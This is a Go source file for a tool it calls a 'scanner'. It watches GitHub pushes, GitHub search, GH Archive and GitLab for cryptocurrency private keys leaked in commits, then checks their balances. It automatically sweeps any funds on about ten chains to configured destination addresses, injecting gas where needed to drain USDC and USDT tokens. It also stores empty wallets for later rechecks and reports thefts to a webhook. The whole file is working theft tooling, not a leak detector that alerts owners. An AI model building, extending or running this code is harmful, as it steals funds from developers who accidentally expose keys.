package main

import (
	"context"
	"crypto/hmac"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"flag"
	"fmt"
	"io"
	"log"
	"math/big"
	"net/http"
	"os"
	"os/signal"
	"strings"
	"syscall"
	"time"
)

var logger = log.New(os.Stderr, "[scanner] ", log.LstdFlags)

type Config struct {
	GitHubToken   string
	GitLabToken   string
	ETHNodeURL    string
	SolanaNodeURL string
	SuiNodeURL    string
	WebhookURL    string
	WebhookSecret string
	InjectorKey   string
	DestETH       string
	DestBTC       string
	DestSolana    string
	DestDOGE      string
	DestLTC       string
	DestSTX       string
	DestSui       string
	DestXLM       string
	Workers       int
	VerifyOnline  bool
	DryRun        bool
	GHArchiveFrom string
	GHArchiveTo   string
}

func main() {
	cfg := &Config{}

	flag.StringVar(&cfg.GitHubToken, "github-token", os.Getenv("GITHUB_TOKEN"),
		"GitHub personal access token(s) — comma-separated for multiple (or set GITHUB_TOKEN env)")
	flag.StringVar(&cfg.GitLabToken, "gitlab-token", os.Getenv("GITLAB_TOKEN"),
		"GitLab personal access token for searching blobs")
	flag.StringVar(&cfg.InjectorKey, "injector-key", os.Getenv("INJECTOR_KEY"),
		"Private key of the gas injector wallet (for ERC20 token sweeping)")
	flag.StringVar(&cfg.ETHNodeURL, "eth-rpc", os.Getenv("ETH_RPC_URL"),
		"Ethereum JSON-RPC endpoint (default: Cloudflare public node)")
	flag.StringVar(&cfg.SolanaNodeURL, "sol-rpc", os.Getenv("SOL_RPC_URL"),
		"Solana JSON-RPC endpoint (default: mainnet-beta public node)")
	flag.StringVar(&cfg.SuiNodeURL, "sui-rpc", os.Getenv("SUI_RPC_URL"),
		"Sui JSON-RPC endpoint (default: fullnode.mainnet.sui.io)")
	flag.StringVar(&cfg.WebhookURL, "webhook-url", os.Getenv("WEBHOOK_URL"),
		"Webhook URL for funded-wallet notifications (e.g. your Render backend)")
	flag.StringVar(&cfg.WebhookSecret, "github-webhook-secret", os.Getenv("GITHUB_WEBHOOK_SECRET"),
		"Secret for verifying GitHub webhook payloads")
	flag.StringVar(&cfg.DestETH, "dest-eth", os.Getenv("DEST_ETH"),
		"Destination Ethereum address for sweeping")
	flag.StringVar(&cfg.DestBTC, "dest-btc", os.Getenv("DEST_BTC"),
		"Destination Bitcoin address for sweeping")
	flag.StringVar(&cfg.DestSolana, "dest-sol", os.Getenv("DEST_SOL"),
		"Destination Solana address for sweeping")
	flag.StringVar(&cfg.DestDOGE, "dest-doge", os.Getenv("DEST_DOGE"),
		"Destination Dogecoin address for sweeping")
	flag.StringVar(&cfg.DestLTC, "dest-ltc", os.Getenv("DEST_LTC"),
		"Destination Litecoin address for sweeping")
	flag.StringVar(&cfg.DestSTX, "dest-stx", os.Getenv("DEST_STX"),
		"Destination Stacks address for sweeping")
	flag.StringVar(&cfg.DestSui, "dest-sui", os.Getenv("DEST_SUI"),
		"Destination Sui address for sweeping")
	flag.StringVar(&cfg.DestXLM, "dest-xlm", os.Getenv("DEST_XLM"),
		"Destination Stellar address for sweeping")
	flag.IntVar(&cfg.Workers, "workers", 4,
		"Number of parallel commit-diff processing workers")
	flag.BoolVar(&cfg.VerifyOnline, "verify-online", false,
		"Call online verify functions in the blockchain detector (slower)")
	flag.BoolVar(&cfg.DryRun, "dry-run", false,
		"Print what would be done without sending transactions or webhooks")
	flag.StringVar(&cfg.GHArchiveFrom, "gharchive-from", os.Getenv("GHARCHIVE_FROM"),
		"Start date for GH Archive historical scan (YYYY-MM-DD, e.g. 2026-06-01)")
	flag.StringVar(&cfg.GHArchiveTo, "gharchive-to", os.Getenv("GHARCHIVE_TO"),
		"End date for GH Archive historical scan (YYYY-MM-DD, default: yesterday)")
	flag.Parse()

	if err := run(cfg); err != nil {
		logger.Fatalf("fatal: %v", err)
	}
}

func run(cfg *Config) error {
	ctx, cancel := signal.NotifyContext(context.Background(), os.Interrupt, syscall.SIGTERM)
	defer cancel()

	port := os.Getenv("PORT")
	if port == "" {
		port = "8080"
	}
	// GitHub push event payload (webhook format).
	type ghWebhookPush struct {
		Ref    string `json:"ref"`
		Before string `json:"before"`
		After  string `json:"after"`
		Commits []struct {
			ID      string `json:"id"`
			Message string `json:"message"`
		} `json:"commits"`
		Repository struct {
			FullName string `json:"full_name"`
		} `json:"repository"`
	}

	commitJobs := make(chan CommitJob, 256)
	foundKeys := make(chan FoundKey, 64)

	go func() {
		mux := http.NewServeMux()
		mux.HandleFunc("/healthz", func(w http.ResponseWriter, r *http.Request) {
			w.WriteHeader(http.StatusOK)
			w.Write([]byte("ok"))
		})
		mux.HandleFunc("/webhook/github", func(w http.ResponseWriter, r *http.Request) {
			if r.Method != http.MethodPost {
				http.Error(w, "method not allowed", http.StatusMethodNotAllowed)
				return
			}
			body, err := io.ReadAll(io.LimitReader(r.Body, 5<<20))
			if err != nil {
				http.Error(w, "read error", http.StatusBadRequest)
				return
			}
			defer r.Body.Close()

			if cfg.WebhookSecret != "" {
				sig := r.Header.Get("X-Hub-Signature-256")
				if sig == "" {
					http.Error(w, "missing signature", http.StatusUnauthorized)
					return
				}
				mac := hmac.New(sha256.New, []byte(cfg.WebhookSecret))
				mac.Write(body)
				expected := "sha256=" + hex.EncodeToString(mac.Sum(nil))
				if !hmac.Equal([]byte(sig), []byte(expected)) {
					http.Error(w, "invalid signature", http.StatusUnauthorized)
					return
				}
			}

			eventType := r.Header.Get("X-GitHub-Event")
			if eventType != "push" {
				w.WriteHeader(http.StatusOK)
				return
			}

			var push ghWebhookPush
			if err := json.Unmarshal(body, &push); err != nil {
				logger.Printf("[webhook] unmarshal error: %v", err)
				http.Error(w, "bad json", http.StatusBadRequest)
				return
			}

			repo := push.Repository.FullName
			if repo == "" {
				http.Error(w, "missing repo", http.StatusBadRequest)
				return
			}

			for _, c := range push.Commits {
				if c.ID == "" {
					continue
				}
				select {
				case commitJobs <- CommitJob{Repo: repo, CommitSHA: c.ID, Ref: push.Ref}:
				default:
					logger.Printf("[webhook] commit channel full, dropping %s/%s", repo, c.ID[:8])
				}
			}
			w.WriteHeader(http.StatusOK)
		})
		logger.Printf("health server on :%s, webhook at /webhook/github", port)
		if err := http.ListenAndServe(":"+port, mux); err != nil {
			logger.Printf("health server exited: %v", err)
		}
	}()

	selfURL := os.Getenv("RENDER_EXTERNAL_URL")
	if selfURL != "" {
		go func() {
			for {
				select {
				case <-ctx.Done():
					return
				case <-time.After(10 * time.Minute):
					resp, err := http.Get(selfURL + "/healthz")
					if err != nil {
						logger.Printf("[keepalive] ping failed: %v", err)
					} else {
						resp.Body.Close()
					}
				}
			}
		}()
		logger.Printf("keep-alive pinging %s every 10m", selfURL)
	}

	logger.Printf("starting scanner (workers=%d, dry-run=%v)", cfg.Workers, cfg.DryRun)
	if cfg.GitHubToken == "" {
		logger.Println("warning: no GitHub token set — rate limited to 60 req/hr")
	}
	if cfg.WebhookURL != "" {
		logger.Printf("notifications will POST to %s", cfg.WebhookURL)
	}

	tokens := strings.Split(cfg.GitHubToken, ",")
	var activeSearchTokens []string
	for _, t := range tokens {
		t = strings.TrimSpace(t)
		if t != "" {
			activeSearchTokens = append(activeSearchTokens, t)
		}
	}
	// Events API works without a token (60 req/hr) or with a classic PAT.
	monitorToken := ""
	if len(activeSearchTokens) > 0 {
		monitorToken = activeSearchTokens[0]
	}
	monitor := NewGitHubMonitor(monitorToken)

	if len(activeSearchTokens) == 0 {
		activeSearchTokens = []string{""}
	}

	go monitor.Run(ctx, commitJobs)
	for _, t := range activeSearchTokens {
		sm := NewSearchMonitor(t)
		go sm.Run(ctx, commitJobs)
	}

	for i := 0; i < cfg.Workers; i++ {
		go commitWorker(ctx, monitor, commitJobs, foundKeys, cfg.VerifyOnline)
	}

	loadStoredWallets()
	go recheckLoop(ctx, cfg)

	if cfg.GitLabToken != "" {
		gl := NewGitLabMonitor(cfg.GitLabToken)
		go gl.Run(ctx, foundKeys)
		logger.Println("[gitlab] monitoring GitLab for leaked keys")
	}

	if os.Getenv("TARGET_REPOS") != "" {
		go runTargetRepoScan(ctx, cfg, commitJobs)
		logger.Printf("[repo-scan] target repos: %s", os.Getenv("TARGET_REPOS"))
	}

	if cfg.GHArchiveFrom != "" {
		from, err := time.Parse("2006-01-02", cfg.GHArchiveFrom)
		if err != nil {
			logger.Printf("[gharchive] invalid from date %q: %v", cfg.GHArchiveFrom, err)
		} else {
			to := time.Now().UTC().Add(-24 * time.Hour)
			if cfg.GHArchiveTo != "" {
				parsed, err := time.Parse("2006-01-02", cfg.GHArchiveTo)
				if err == nil {
					to = parsed
				}
			}
			archiver := NewGHArchiveScanner()
			go archiver.RunHistoricalScan(ctx, commitJobs, from, to)
			logger.Printf("[gharchive] scanning from %s to %s", from.Format("2006-01-02"), to.Format("2006-01-02"))
		}
	}

	for {
		select {
		case <-ctx.Done():
			return nil
		case key := <-foundKeys:
			handleFoundKey(ctx, key, cfg)
		}
	}
}

func commitWorker(ctx context.Context, mon *GitHubMonitor, jobs <-chan CommitJob, out chan<- FoundKey, verifyOnline bool) {
	for {
		select {
		case <-ctx.Done():
			return
		case job := <-jobs:
			commitWorkerProcess(ctx, mon, job, out, verifyOnline)
		}
	}
}

func commitWorkerProcess(ctx context.Context, mon *GitHubMonitor, job CommitJob, out chan<- FoundKey, verifyOnline bool) {
	defer func() {
		if r := recover(); r != nil {
			logger.Printf("[worker] panic processing %s/%s: %v", job.Repo, job.CommitSHA, r)
		}
	}()

	diff, err := mon.FetchCommitDiff(ctx, job.Repo, job.CommitSHA)
	if err != nil {
		logger.Printf("[worker] fetch diff %s/%s: %v", job.Repo, job.CommitSHA, err)
		return
	}
	keys := ExtractKeys(ctx, diff, job.Repo, job.CommitSHA, verifyOnline)
	for _, k := range keys {
		logger.Printf("[found] chain=%s repo=%s sha=%s", k.Chain, k.Repo, k.CommitSHA)
		select {
		case out <- k:
		case <-ctx.Done():
			return
		}
	}
}

func handleFoundKey(ctx context.Context, key FoundKey, cfg *Config) {
	addrs, err := DeriveAddresses(key)
	if err != nil {
		logger.Printf("[derive] %s key from %s: %v", key.Chain, key.Repo, err)
	}

	balances, err := CheckBalances(ctx, addrs, cfg)
	if err != nil {
		logger.Printf("[balance] error: %v", err)
	}

	if addrs.ETH != "" {
		usdc := checkERC20Balance(ctx, addrs.ETH, usdcContract, 6, "USDC", cfg.ETHNodeURL)
		usdt := checkERC20Balance(ctx, addrs.ETH, usdtContract, 6, "USDT", cfg.ETHNodeURL)
		if usdc.HasFunds {
			balances = append(balances, usdc)
		}
		if usdt.HasFunds {
			balances = append(balances, usdt)
		}
	}

	var ethBalance *big.Int
	tokenCount := 0
	hasNativeETH := false
	for _, b := range balances {
		if b.Chain == "Ethereum" && b.HasFunds {
			ethBalance = b.Balance
			hasNativeETH = true
		}
		if b.Chain == "USDC" || b.Chain == "USDT" {
			tokenCount++
		}
	}

	skipTokens := false
	if tokenCount > 0 && cfg.InjectorKey != "" {
		if ethBalance == nil {
			ethBalance = big.NewInt(0)
		}
		gasPrice, gpErr := tryETHGasPrice(ctx, cfg.ETHNodeURL)
		if gpErr == nil {
			needed := new(big.Int).Mul(gasPrice, big.NewInt(21000+int64(tokenCount)*int64(erc20GasLimit)))
			if ethBalance.Cmp(needed) < 0 {
				logger.Printf("[inject] ETH balance %s insufficient for %d token sweeps, injecting gas",
					formatETH(ethBalance), tokenCount)
				if iErr := InjectGas(ctx, cfg, addrs.ETH, tokenCount); iErr != nil {
					logger.Printf("[inject] error: %v — skipping token sweeps", iErr)
					if !hasNativeETH {
						skipTokens = true
					}
				} else {
					ethBalance = needed
				}
			}
		}
	}

	anyFunds := false
	for _, b := range balances {
		logBalance(b, key)
		if !b.HasFunds {
			continue
		}
		anyFunds = true
		if skipTokens && (b.Chain == "USDC" || b.Chain == "USDT") {
			logger.Printf("[sweep] skipping %s sweep — no gas available", b.Chain)
			continue
		}
		if cfg.DryRun {
			logger.Printf("[dry-run] would notify+sweep %s from %s (%s)", b.BalanceHuman, b.Address, key.Repo)
			continue
		}
		if cfg.WebhookURL != "" {
			notify(ctx, key, b, cfg.WebhookURL)
		}
		sweep(ctx, key, b, addrs, cfg)
	}

	if !anyFunds && key.Raw != "" && key.Repo != "recheck" {
		ethAddr := ""
		if addrs.ETH != "" {
			ethAddr = addrs.ETH
		}
		addStoredWallet(key, ethAddr)
	}
}

func logBalance(b BalanceResult, key FoundKey) {
	status := "empty"
	if b.HasFunds {
		status = "HAS FUNDS"
	}
	logger.Printf("[balance] %s addr=%s balance=%s [%s] source=%s@%s",
		b.Chain, b.Address, b.BalanceHuman, status, key.Repo, key.CommitSHA[:8])
}

func sweep(ctx context.Context, key FoundKey, b BalanceResult, addrs DerivedAddresses, cfg *Config) {
	var (
		txHash string
		err    error
	)

	switch b.Chain {
	case "Ethereum":
		if cfg.DestETH == "" {
			logger.Println("[sweep] no dest-eth configured, skipping")
			return
		}
		txHash, err = SweepETH(ctx, key.Raw, cfg.DestETH, cfg.ETHNodeURL)

	case "Bitcoin":
		if cfg.DestBTC == "" {
			logger.Println("[sweep] no dest-btc configured, skipping")
			return
		}
		txHash, err = SweepBTC(ctx, key.Raw, cfg.DestBTC, "")

	case "Dogecoin":
		if cfg.DestDOGE == "" {
			logger.Println("[sweep] no dest-doge configured, skipping")
			return
		}
		txHash, err = SweepDOGE(ctx, key.Raw, cfg.DestDOGE)

	case "Litecoin":
		if cfg.DestLTC == "" {
			logger.Println("[sweep] no dest-ltc configured, skipping")
			return
		}
		txHash, err = SweepLTC(ctx, key.Raw, cfg.DestLTC)

	case "Stacks":
		if cfg.DestSTX == "" {
			logger.Println("[sweep] no dest-stx configured, skipping")
			return
		}
		txHash, err = SweepSTX(ctx, key.Raw, cfg.DestSTX)

	case "Solana":
		if cfg.DestSolana == "" {
			logger.Println("[sweep] no dest-sol configured, skipping")
			return
		}
		txHash, err = SweepSolana(ctx, key.Raw, cfg.DestSolana, cfg.SolanaNodeURL)

	case "Sui":
		if cfg.DestSui == "" {
			logger.Println("[sweep] no dest-sui configured, skipping")
			return
		}
		txHash, err = SweepSui(ctx, key.Raw, cfg.DestSui, cfg.SuiNodeURL)

	case "Stellar":
		if cfg.DestXLM == "" {
			logger.Println("[sweep] no dest-xlm configured, skipping")
			return
		}
		txHash, err = SweepXLM(ctx, key.Raw, cfg.DestXLM)

	case "USDC":
		if cfg.DestETH == "" {
			logger.Println("[sweep] no dest-eth configured, skipping USDC sweep")
			return
		}
		txHash, err = SweepERC20(ctx, key.Raw, usdcContract, cfg.DestETH, cfg.ETHNodeURL)

	case "USDT":
		if cfg.DestETH == "" {
			logger.Println("[sweep] no dest-eth configured, skipping USDT sweep")
			return
		}
		txHash, err = SweepERC20(ctx, key.Raw, usdtContract, cfg.DestETH, cfg.ETHNodeURL)

	default:
		logger.Printf("[sweep] chain %s not yet supported for sweeping", b.Chain)
		return
	}

	if err != nil {
		logger.Printf("[sweep] ERROR sweeping %s from %s: %v", b.Chain, b.Address, err)
		if cfg.WebhookURL != "" {
			notifySwept(ctx, key, b, "", err.Error(), cfg.WebhookURL)
		}
		return
	}
	fmt.Printf("SWEPT %s %s from %s (key from %s@%s) → tx %s\n",
		b.BalanceHuman, b.Chain, b.Address, key.Repo, key.CommitSHA, txHash)
	if cfg.WebhookURL != "" {
		notifySwept(ctx, key, b, txHash, "", cfg.WebhookURL)
	}
	removeStoredWallet(key.Raw, key.Chain)
}
